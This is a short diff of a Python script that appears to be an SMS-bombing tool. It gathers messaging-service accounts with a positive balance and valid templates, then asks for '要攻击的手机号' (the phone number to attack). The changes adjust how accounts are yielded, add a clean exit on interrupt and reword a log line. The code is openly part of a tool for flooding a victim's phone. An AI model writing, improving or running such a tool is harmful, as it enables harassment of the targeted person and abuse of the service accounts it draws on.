@@ -40,8 +40,10 @@ def collect_accounts():
                 balance = float(info['Account']['balance'])
                 if balance > 0:
                     account.balance = balance
-                    if account.load_valid_template_ids():
-                        yield account
+            if account.load_valid_template_ids():
+                yield account
+        except KeyboardInterrupt:
+            exit(0)
         except:
             pass
 
@@ -51,7 +53,7 @@ if __name__ == '__main__':
 
     logging.info('开始搜索账号')
     accounts = list(collect_accounts())
-    logging.info('收集到 %d 个可用账号' % len(accounts))
+    logging.info('收集到 %d 个账号' % len(accounts))
     target = input('要攻击的手机号: ').strip()
     start = time.time()
     try:
